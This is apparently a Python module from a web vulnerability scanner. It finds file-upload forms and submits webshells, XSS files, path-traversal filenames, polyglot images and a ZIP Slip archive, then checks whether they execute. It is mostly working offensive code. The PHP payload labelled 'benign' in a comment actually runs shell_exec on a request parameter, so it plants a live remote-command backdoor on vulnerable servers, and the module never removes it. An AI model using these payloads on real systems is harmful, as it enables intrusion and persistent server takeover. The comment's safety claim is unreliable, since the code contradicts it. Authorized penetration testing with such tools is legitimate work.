"""
websecure.scanners.file_upload
------------------------------
File upload vulnerability scanner.

Attacks:
- Extension bypass (.php5, .phtml, .phar, .php3, .php7, .pHp, double-ext, null-byte)
- Content-type bypass (PHP with image/jpeg MIME)
- PHP / ASPX / JSP webshell upload
- SVG XSS upload
- Path traversal filenames (../../../var/www/html/)
- ZIP Slip (zip archive with traversal path)
- Polyglot JPEG+PHP
- Enhanced response analysis (JSON link extraction, execution verification)
"""
import io
import json
import logging
import random
import re
import string
import zipfile
from typing import Any, Dict, List, Optional
from urllib.parse import urljoin, urlparse

try:
    from bs4 import BeautifulSoup
    _BS4_AVAILABLE = True
except ImportError:
    _BS4_AVAILABLE = False

from websecure.core.reporting import add_result
from websecure.scanners.base import BaseScanner

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Magic bytes
# ---------------------------------------------------------------------------
_JPEG_MAGIC = b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00"
_PNG_MAGIC = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"
_GIF_MAGIC = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"

# ---------------------------------------------------------------------------
# Webshell payloads (benign test markers — no destructive commands)
# ---------------------------------------------------------------------------
_PHP_SHELL = b"<?php echo 'WS_PHP_EXEC_TEST'; if(isset($_GET['c'])){echo shell_exec($_GET['c']);}?>"
_ASPX_SHELL = (
    b"<%@ Page Language=\"C#\" %>"
    b"<% Response.Write(\"WS_ASPX_EXEC_TEST\"); %>"
)
_JSP_SHELL = b"<% out.print(\"WS_JSP_EXEC_TEST\"); %>"
_SVG_XSS = (
    b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
    b"<svg xmlns=\"http://www.w3.org/2000/svg\">"
    b"<script>alert('WS_SVG_XSS|'+document.domain)</script>"
    b"</svg>"
)


def _make_zip_slip() -> bytes:
    """Creates an in-memory ZIP archive with a path-traversal filename (ZIP Slip)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("../../../var/www/html/ws_zipslip.txt", "WS_ZIP_SLIP_TEST")
        zf.writestr("../../../../webapps/ROOT/ws_zipslip.jsp", _JSP_SHELL.decode())
    return buf.getvalue()


# ---------------------------------------------------------------------------
# Full payload catalog
# ---------------------------------------------------------------------------
PAYLOADS: List[Dict[str, Any]] = [
    # --- Benign (baseline / success-detection) ---
    {
        "name": "ws_benign.txt",
        "content": b"WebSecure Scanner Test File - Safe",
        "mime": "text/plain",
        "check": "safe",
    },

    # --- HTML XSS ---
    {
        "name": "ws_xss.html",
        "content": b"<html><body><script>alert('WS_XSS_TEST')</script></body></html>",
        "mime": "text/html",
        "check": "xss",
    },

    # --- SVG XSS ---
    {
        "name": "ws_xss.svg",
        "content": _SVG_XSS,
        "mime": "image/svg+xml",
        "check": "xss",
    },

    # --- PHP webshell (standard .php) ---
    {
        "name": "ws_shell.php",
        "content": _PHP_SHELL,
        "mime": "application/x-php",
        "check": "rce",
    },

    # --- PHP with image/jpeg MIME (content-type bypass) ---
    {
        "name": "ws_ctbypass.php",
        "content": _PHP_SHELL,
        "mime": "image/jpeg",
        "check": "rce",
    },

    # --- PHP with image magic bytes (polyglot) ---
    {
        "name": "ws_polyglot.jpg.php",
        "content": _JPEG_MAGIC + _PHP_SHELL,
        "mime": "image/jpeg",
        "check": "rce",
    },

    # --- Alternative PHP extensions ---
    {
        "name": "ws_shell.php5",
        "content": _PHP_SHELL,
        "mime": "application/octet-stream",
        "check": "rce",
    },
    {
        "name": "ws_shell.phtml",
        "content": _PHP_SHELL,
        "mime": "text/html",
        "check": "rce",
    },
    {
        "name": "ws_shell.phar",
        "content": _PHP_SHELL,
        "mime": "application/octet-stream",
        "check": "rce",
    },
    {
        "name": "ws_shell.php3",
        "content": _PHP_SHELL,
        "mime": "application/x-httpd-php",
        "check": "rce",
    },
    {
        "name": "ws_shell.php7",
        "content": _PHP_SHELL,
        "mime": "application/x-httpd-php",
        "check": "rce",
    },

    # --- PHP case variation ---
    {
        "name": "ws_shell.pHp",
        "content": _PHP_SHELL,
        "mime": "application/x-php",
        "check": "rce",
    },
    {
        "name": "ws_shell.PHP",
        "content": _PHP_SHELL,
        "mime": "application/octet-stream",
        "check": "rce",
    },

    # --- Double extension bypass ---
    {
        "name": "ws_shell.php.jpg",
        "content": _JPEG_MAGIC + _PHP_SHELL,
        "mime": "image/jpeg",
        "check": "rce",
    },
    {
        "name": "ws_shell.jpg.php",
        "content": _JPEG_MAGIC + _PHP_SHELL,
        "mime": "image/jpeg",
        "check": "rce",
    },
    {
        "name": "ws_shell.php.png",
        "content": _PNG_MAGIC + _PHP_SHELL,
        "mime": "image/png",
        "check": "rce",
    },

    # --- Null byte bypass ---
    {
        "name": "ws_shell.php\x00.jpg",
        "content": _PHP_SHELL,
        "mime": "image/jpeg",
        "check": "rce",
    },

    # --- ASPX webshell ---
    {
        "name": "ws_shell.aspx",
        "content": _ASPX_SHELL,
        "mime": "application/octet-stream",
        "check": "rce",
    },
    {
        "name": "ws_shell.ashx",
        "content": _ASPX_SHELL,
        "mime": "application/octet-stream",
        "check": "rce",
    },

    # --- JSP webshell ---
    {
        "name": "ws_shell.jsp",
        "content": _JSP_SHELL,
        "mime": "application/octet-stream",
        "check": "rce",
    },
    {
        "name": "ws_shell.jspx",
        "content": _JSP_SHELL,
        "mime": "application/octet-stream",
        "check": "rce",
    },

    # --- Path traversal filenames ---
    {
        "name": "../../../var/www/html/ws_shell.php",
        "content": _PHP_SHELL,
        "mime": "application/octet-stream",
        "check": "path_traversal",
    },
    {
        "name": "....//....//....//var/www/html/ws_shell.php",
        "content": _PHP_SHELL,
        "mime": "application/octet-stream",
        "check": "path_traversal",
    },
    {
        "name": "..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fws_shell.php",
        "content": _PHP_SHELL,
        "mime": "application/octet-stream",
        "check": "path_traversal",
    },

    # --- ZIP Slip ---
    {
        "name": "ws_zipslip.zip",
        "content": _make_zip_slip(),
        "mime": "application/zip",
        "check": "zip_slip",
    },
]

# Execution markers per check type
_EXEC_MARKERS = {
    "rce":    [b"WS_PHP_EXEC_TEST", b"WS_ASPX_EXEC_TEST", b"WS_JSP_EXEC_TEST"],
    "xss":    [b"WS_XSS_TEST", b"WS_SVG_XSS"],
    "zip_slip": [b"WS_ZIP_SLIP_TEST"],
}

# Candidate discovery paths
_COMMON_UPLOAD_PATHS = [
    "/upload", "/upload.php", "/fileupload", "/file-upload",
    "/api/upload", "/v1/upload", "/v2/upload",
    "/media/upload", "/assets/upload", "/attachments",
]


def _generate_boundary() -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=30))


def _looks_like_upload_form(html: str) -> bool:
    if not html:
        return False
    lower = html.lower()
    return ('type="file"' in lower or "type='file'" in lower
            or "multipart/form-data" in lower)


def _parse_upload_forms(url: str, html: str) -> List[Dict]:
    forms = []
    if not html:
        return forms

    if _BS4_AVAILABLE:
        soup = BeautifulSoup(html, "html.parser")
        for form in soup.find_all("form"):
            if not form.find("input", {"type": "file"}):
                continue
            action = form.get("action") or ""
            method = (form.get("method") or "POST").upper()
            file_param = "file"
            inputs = []
            for inp in form.find_all("input"):
                iname = inp.get("name")
                itype = (inp.get("type") or "text").lower()
                if not iname:
                    continue
                if itype == "file":
                    file_param = iname
                    inputs.append({"name": iname, "type": "file"})
                elif itype not in ("submit", "button", "image", "reset"):
                    inputs.append({"name": iname, "type": "text",
                                   "value": inp.get("value", "1")})
            forms.append({
                "action": urljoin(url, action),
                "method": method,
                "file_param": file_param,
                "inputs": inputs,
            })
    elif "type=\"file\"" in html.lower():
        # Regex fallback: crude but functional
        forms.append({
            "action": url, "method": "POST",
            "file_param": "file", "inputs": [],
        })
    return forms


def _find_uploaded_url(response_text: str, filename: str, base_url: str) -> Optional[str]:
    """
    Tries to extract the URL of the uploaded file from the server response.
    Handles JSON responses and HTML href/src patterns.
    """
    # 1. JSON: {"url": "...", "path": "...", "file": "...", "location": "..."}
    try:
        data = json.loads(response_text)
        for key in ("url", "path", "file", "location", "src", "link", "href"):
            val = data.get(key) or (data.get("data") or {}).get(key) if isinstance(data.get("data"), dict) else None
            if val and isinstance(val, str):
                return urljoin(base_url, val)
    except (ValueError, AttributeError):
        pass

    # 2. HTML src/href containing the filename
    safe_name = re.escape(filename.split("/")[-1].split("\x00")[0])
    m = re.search(r'["\']([^"\']*' + safe_name + r')["\']', response_text)
    if m:
        return urljoin(base_url, m.group(1))

    # 3. Any URL ending with the filename base
    ext = "." + filename.rsplit(".", 1)[-1] if "." in filename else ""
    if ext:
        m2 = re.search(r'https?://[^\s"\'<>]+' + re.escape(ext), response_text)
        if m2:
            return m2.group(0)

    return None


class FileUploadScanner(BaseScanner):
    """
    Robust file upload vulnerability scanner.

    Discovers upload endpoints via form scanning and common path probing,
    then tests a comprehensive set of bypass payloads including:
    extension bypasses, content-type spoofing, webshells (PHP/ASPX/JSP),
    SVG XSS, path traversal filenames, and ZIP Slip archives.
    """

    name = "file_upload"
    phase = "offensive"

    def run(self, url: str, **kwargs) -> Dict:
        endpoints = kwargs.get("endpoints") or [url]
        base_url = kwargs.get("base_url") or url

        upload_forms = self._discover_forms(endpoints, base_url)
        if not upload_forms:
            logger.info("[FileUpload] No upload forms found")
            self.add("offensive", {
                "type": "File Upload", "severity": "Info",
                "reason": "No file upload endpoints discovered",
            })
            return self.results

        logger.info(f"[FileUpload] Found {len(upload_forms)} upload form(s)")
        self._attack_forms(upload_forms)
        return self.results

    def _discover_forms(self, endpoints: List[str], base_url: str) -> List[Dict]:
        upload_forms: List[Dict] = []
        checked: set = set()

        candidates = [
            u for u in endpoints
            if not any(u.endswith(ext) for ext in
                       (".css", ".js", ".png", ".jpg", ".gif", ".woff", ".ttf", ".svg", ".ico"))
        ]

        for url in candidates:
            if url in checked:
                continue
            checked.add(url)
            try:
                resp = self.session.get(url, timeout=10)
                if _looks_like_upload_form(resp.text):
                    upload_forms.extend(_parse_upload_forms(url, resp.text))
            except Exception as exc:
                logger.debug(f"[FileUpload] Crawl fetch/parse error for {url}: {exc!r}")

        if not upload_forms:
            logger.info("[FileUpload] No forms found via crawl — probing common paths")
            for path in _COMMON_UPLOAD_PATHS:
                try:
                    target = urljoin(base_url, path)
                    if target in checked:
                        continue
                    checked.add(target)
                    resp = self.session.get(target, timeout=5)
                    if resp.status_code == 200 and _looks_like_upload_form(resp.text):
                        upload_forms.extend(_parse_upload_forms(target, resp.text))
                        logger.info(f"[FileUpload] Discovered upload form at {target}")
                except Exception as ex:
                    logger.debug(f"[FileUpload] Probe error at {path}: {ex}")

        return upload_forms

    def _attack_forms(self, forms: List[Dict]):
        for form in forms:
            target_url = form["action"]
            file_key = form["file_param"]
            base_data = {
                inp["name"]: inp.get("value", "test")
                for inp in form.get("inputs", [])
                if inp.get("type") != "file"
            }

            for payload in PAYLOADS:
                self._try_payload(target_url, file_key, base_data, payload)

    def _try_payload(
        self,
        target_url: str,
        file_key: str,
        base_data: Dict,
        payload: Dict,
    ):
        try:
            files = {file_key: (payload["name"], payload["content"], payload["mime"])}
            r = self.session.post(target_url, files=files, data=base_data, timeout=15)
        except Exception as ex:
            logger.debug(f"[FileUpload] Upload error for {payload['name']}: {ex}")
            return

        if r.status_code not in (200, 201, 202):
            return

        check = payload["check"]
        filename = payload["name"]

        # Try to locate the uploaded file URL
        uploaded_url = _find_uploaded_url(r.text, filename, target_url)

        # Reflect check: filename echoed in response (weak but indicative)
        short_name = filename.split("/")[-1].split("\x00")[0]
        name_reflected = short_name in r.text and short_name

        is_vuln = False
        severity = "Info"
        evidence: Dict[str, Any] = {}

        if name_reflected:
            evidence["reflected_filename"] = short_name
        if uploaded_url:
            evidence["uploaded_url"] = uploaded_url

        if check == "path_traversal" and name_reflected:
            is_vuln = True
            severity = "High"
            evidence["detail"] = "Path-traversal filename was accepted and reflected"

        elif check == "zip_slip" and (name_reflected or r.status_code in (200, 201)):
            is_vuln = True
            severity = "High"
            evidence["detail"] = "ZIP archive with traversal path accepted"

        elif uploaded_url and check in _EXEC_MARKERS:
            # Verify actual execution by fetching the uploaded file
            try:
                vr = self.session.get(uploaded_url, timeout=10)
                for marker in _EXEC_MARKERS[check]:
                    if marker in vr.content:
                        is_vuln = True
                        severity = "Critical" if check == "rce" else "High"
                        evidence["execution_marker"] = marker.decode()
                        # Also check content-type for XSS
                        if check == "xss":
                            ct = vr.headers.get("Content-Type", "").lower()
                            if "html" not in ct and "svg" not in ct:
                                is_vuln = False  # served as attachment, not exploitable
                        break
            except Exception as exc:
                logger.debug(f"[FileUpload] Execution verification fetch failed for {uploaded_url}: {exc!r}")
        elif name_reflected and check == "rce":
            # Upload succeeded but we can't verify execution — still flag as Medium
            is_vuln = True
            severity = "Medium"
            evidence["detail"] = "Executable file accepted — execution not verified"

        if is_vuln:
            entry = {
                "type": "Unrestricted File Upload",
                "severity": severity,
                "url": target_url,
                "filename": filename,
                "check": check,
                "evidence": evidence,
            }
            self.add("offensive", entry)
            logger.warning(f"[FileUpload] VULN ({severity}): {target_url} — {filename}")


# ---------------------------------------------------------------------------
# Module-level adapter (backward-compatible with main.py call convention)
# ---------------------------------------------------------------------------

def run(
    session,
    endpoints: List[str],
    results: Dict[str, Any],
    debug: bool = False,
    base_url: str = None,
) -> List[Dict[str, Any]]:
    if debug:
        logger.setLevel(logging.DEBUG)

    scanner = FileUploadScanner(session=session, results=results, debug=debug)
    scanner.run(
        url=base_url or (endpoints[0] if endpoints else ""),
        endpoints=endpoints,
        base_url=base_url,
    )

    return [
        item for item in results.get("offensive", [])
        if item.get("type") == "Unrestricted File Upload"
    ]
